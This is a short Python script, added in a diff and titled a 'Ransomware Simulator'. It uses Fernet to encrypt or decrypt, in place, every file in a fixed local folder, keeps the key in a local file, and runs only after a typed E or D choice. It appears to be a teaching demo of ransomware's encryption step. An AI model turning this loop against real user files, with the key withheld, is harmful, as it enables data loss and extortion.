@@ -1,0 +1,55 @@
+from cryptography.fernet import Fernet
+import os
+
+# Generate encryption key
+def generate_key():
+    key = Fernet.generate_key()
+    with open("secret.key", "wb") as key_file:
+        key_file.write(key)
+
+# Load existing key
+def load_key():
+    return open("secret.key", "rb").read()
+
+# Encrypt files
+def encrypt_folder(folder_path, key):
+    fernet = Fernet(key)
+    for filename in os.listdir(folder_path):
+        file_path = os.path.join(folder_path, filename)
+        with open(file_path, "rb") as file:
+            data = file.read()
+        encrypted_data = fernet.encrypt(data)
+        with open(file_path, "wb") as file:
+            file.write(encrypted_data)
+    print("[+] Files Encrypted Successfully.")
+
+# Decrypt files
+def decrypt_folder(folder_path, key):
+    fernet = Fernet(key)
+    for filename in os.listdir(folder_path):
+        file_path = os.path.join(folder_path, filename)
+        with open(file_path, "rb") as file:
+            data = file.read()
+        decrypted_data = fernet.decrypt(data)
+        with open(file_path, "wb") as file:
+            file.write(decrypted_data)
+    print("[+] Files Decrypted Successfully.")
+
+# Main logic
+if __name__ == "__main__":
+    folder = "files_to_encrypt"
+
+    if not os.path.exists("secret.key"):
+        generate_key()
+
+    key = load_key()
+
+    print("=== Ransomware Simulator ===")
+    choice = input("Enter E to encrypt or D to decrypt: ").strip().lower()
+
+    if choice == 'e':
+        encrypt_folder(folder, key)
+    elif choice == 'd':
+        decrypt_folder(folder, key)
+    else:
+        print("[-] Invalid option. Use E or D.")
